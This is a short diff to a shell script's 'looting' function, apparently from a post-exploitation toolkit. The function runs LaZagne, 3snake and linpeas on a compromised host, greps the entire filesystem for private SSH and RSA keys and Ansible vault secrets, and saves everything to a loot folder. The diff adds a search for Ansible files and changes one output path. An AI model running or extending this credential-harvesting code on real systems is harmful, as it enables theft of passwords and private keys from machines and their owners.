@@ -100,12 +100,14 @@ looting() {
     cd blood || exit
     mkdir loot
     ./lazagne* all | tee -a loot/lazagne.txt
-    ./3snake* -d -o ../loot/3snake.txt
+    ./3snake* -d -o /loot/3snake.txt
     ./linpeas.sh -a | tee -a loot/linpeas.txt
     echo "======================= POSSIBLE PRIV KEYS:" | tee -a loot/priv_keys.txt
     grep -r -a "^-----BEGIN OPENSSH PRIVATE KEY-----$\|^-----BEGIN ENCRYPTED PRIVATE KEY-----$\|^-----BEGIN PRIVATE KEY-----$\|^-----BEGIN RSA PRIVATE KEY-----$" / 2>/dev/null | tee -a loot/priv_keys.txt
     echo "======================= POSSIBLE ANSBILE VAULT:" | tee -a loot/ansible_vault.txt
     grep -r -a "\!vault" / 2>/dev/null  | tee -a loot/ansible_vault.txt
+    echo "======================= POSSIBLE ANSBILE FILES:" | tee -a loot/ansible_vault.txt
+    find / -name "ansible" 2>/dev/null | tee -a loot/ansible_vault.txt
     echo "======================="
     echo "CHECK THESE LOCATIONS" | tee -a loot/files_to_check.txt
     echo "======================= AUTH LOGS:" | tee -a loot/files_to_check.txt
